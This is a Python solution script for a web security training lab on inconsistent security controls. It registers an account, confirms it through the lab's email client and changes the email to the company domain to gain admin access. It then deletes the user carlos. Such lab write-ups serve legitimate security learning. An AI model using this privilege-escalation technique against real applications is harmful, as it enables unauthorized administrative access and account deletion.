# Inconsistent security controls

> This lab's flawed logic allows arbitrary users to access administrative functionality that should only be available to company employees. To solve the lab, access the admin panel and delete the user `carlos`.

```python
import requests
import re
from bs4 import BeautifulSoup

# Configuration
BASE_URL = "https://0a9800c3045c26cc81afe83900a80043.web-security-academy.net/"
EMAIL_CLIENT_URL = "https://exploit-0a0100ff04bb26c78196e73e01bd00d4.exploit-server.net/email"

def exploit_inconsistent_logic(url, email_client):
    session = requests.Session()
    
    # 1. Registration Phase
    exploit_domain = email_client.split('/')[2]
    attacker_email = f"attacker@{exploit_domain}"
    
    register_endpoint = f"{url}register"
    response = session.get(register_endpoint)
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_token = soup.find("input", {"name": "csrf"})['value']
    
    register_creds = {
        "csrf": csrf_token,
        "username": "sithum",
        "email": attacker_email,
        "password": "sithum22"
    }
    
    session.post(register_endpoint, data=register_creds)
    print("[+] REGISTRATION PAYLOAD SENT")
    
    # 2. Confirmation Phase
    response = session.get(email_client)
    soup = BeautifulSoup(response.text, 'html.parser')
    confirm_url = soup.find('a', href=re.compile(r"temp-registration-token"))['href']
    
    session.get(confirm_url)
    print("[+] ACCOUNT VERIFIED")

    # 3. Authentication Phase
    login_endpoint = f"{url}login"
    response = session.get(login_endpoint)
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_token = soup.find("input", {"name": "csrf"})['value']
    
    login_creds = {
        "csrf": csrf_token,
        "username": "sithum",
        "password": "sithum22"
    }
    session.post(login_endpoint, data=login_creds)
    print("[+] LOGGED IN SUCCESSFULLY")

    # 4. Email Tampering Phase (The Logic Bypass)
    account_endpoint = f"{url}my-account"
    response = session.get(account_endpoint)
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_token = soup.find("input", {"name": "csrf"})['value']
    
    change_email_endpoint = f"{url}my-account/change-email"
    tamper_details = {
        "email": "attacker@dontwannacry.com",
        "csrf": csrf_token
    }
    
    session.post(change_email_endpoint, data=tamper_details)
    print("[+] EMAIL TAMPERED: Privileges Escalated")

    # 5. Execution Phase
    delete_endpoint = f"{url}admin/delete"
    target_info = {
        "username": "carlos"
    }
    
    session.get(delete_endpoint, params=target_info)
    
    # Verification
    final_check = session.get(url)
    if "Congratulations" in final_check.text:
        print("[+] TARGET SECURED: Lab Solved")

if __name__ == "__main__":
    exploit_inconsistent_logic(BASE_URL, EMAIL_CLIENT_URL)
```